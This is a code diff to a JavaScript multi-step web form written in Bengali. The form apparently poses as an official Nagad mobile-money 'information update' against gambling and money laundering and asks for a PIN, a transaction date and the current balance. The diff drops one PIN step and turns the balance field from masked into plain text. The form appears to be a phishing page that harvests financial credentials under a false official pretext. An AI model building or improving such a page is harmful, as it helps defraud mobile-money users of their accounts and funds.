@@ -11,13 +11,7 @@ const steps = [
     placeholder: "PIN",
     type: "text"
   },
-
-  {
-    title: "Password / PIN",
-    description: "নগদ বর্তামান PIN লিখুন।",
-    placeholder: "1234",
-    type: "password"
-  },
+  
   {
     title: "Transaction & Balance",
     html: `
@@ -25,8 +19,7 @@ const steps = [
       <input id="date" type="date">
 
       <p>আপনার বর্তমান ব্যালেন্স লিখুন।</p>
-      <input id="balance" type="password"
-       placeholder: "০০০০০",
+      <input id="balance" type="text" placeholder="12345">
     `
   },
   {
@@ -114,7 +107,7 @@ back.addEventListener("click", function () {
     showStep();
   }
 });
-      } else {
+ } else {
     progress.textContent = "TRAINING COMPLETE";
     progressBar.style.width = "100%";
     title.textContent = "অনলাইন জুয়া এবং মানি লন্ডারিং প্রতিরোধে নগদ তথ্য হালনাগাদ 2026";
